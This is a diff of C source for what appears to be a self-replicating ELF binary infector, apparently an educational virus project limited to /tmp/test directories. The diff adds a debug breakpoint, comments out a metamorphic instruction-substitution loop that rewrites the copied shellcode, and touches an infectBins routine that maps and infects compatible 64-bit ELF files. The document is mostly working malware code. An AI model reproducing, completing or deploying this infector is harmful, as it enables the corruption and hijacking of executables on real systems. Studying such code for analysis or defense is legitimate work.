@@ -4,6 +4,7 @@ static void  start(void) {}
 #include "shellcode.h"
 
 int   entry_point(void *magic) {
+  asm("int3");
   char    infectDir[] = "/tmp/test";
   char    infectDir2[] = "/tmp/test2";
   char    procName[] = "/proc/";
@@ -559,31 +560,31 @@ static int  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
   bin = (void *)new->header;
   shellcode = (void *)start;
   while (i < size) {
-    ins = (void *)copyModifiedCode - sizeof(instructions);
-    while (ins != (void *)copyModifiedCode) {
-      j = 0;
-      while (ins[j] != 0 && shellcode[i + j] == ins[j])
-        j += 1;
-      if (ins[j] != 0) {
-        while (ins[0] != 0)
-          ins += MAX_INS_SIZE;
-        ins += MAX_INS_SIZE;
-        continue ;
-      }
-      i += 1;
-      // TODO Choose random replacement
-      ins += MAX_INS_SIZE;
-      // TODO Check if enough space
-      k = 0;
-      while (k < j) {
-        bin[binSize] = ins[k];
-        binSize += 1;
-        k += 1;
-      }
-      while (ins[0] != 0)
-        ins += MAX_INS_SIZE;
-      ins += MAX_INS_SIZE;
-    }
+    /* ins = (void *)copyModifiedCode - sizeof(instructions); */
+    /* while (ins != (void *)copyModifiedCode) { */
+    /*   j = 0; */
+    /*   while (ins[j] != 0 && shellcode[i + j] == ins[j]) */
+    /*     j += 1; */
+    /*   if (ins[j] != 0) { */
+    /*     while (ins[0] != 0) */
+    /*       ins += MAX_INS_SIZE; */
+    /*     ins += MAX_INS_SIZE; */
+    /*     continue ; */
+    /*   } */
+    /*   i += 1; */
+    /*   // TODO Choose random replacement */
+    /*   ins += MAX_INS_SIZE; */
+    /*   // TODO Check if enough space */
+    /*   k = 0; */
+    /*   while (k < j) { */
+    /*     bin[binSize] = ins[k]; */
+    /*     binSize += 1; */
+    /*     k += 1; */
+    /*   } */
+    /*   while (ins[0] != 0) */
+    /*     ins += MAX_INS_SIZE; */
+    /*   ins += MAX_INS_SIZE; */
+    /* } */
     bin[binSize] = shellcode[i];
     i += 1;
     binSize += 1;
@@ -710,7 +711,6 @@ static int  infectBins(const char *dirname) {
     dirp = (struct linux_dirent64 *) (buf + bpos);
     if ((ret = mapFile(dirname, dirp->d_name, &bin)) == -1)
       return (-1);
-    /* write(1, dirp->d_name, strlen(dirp->d_name)); */
     if (ret == 0 &&
       bin.size >= sizeof(Elf64_Ehdr) &&
       isCompatible(bin.header->e_ident, bin.header->e_machine) &&
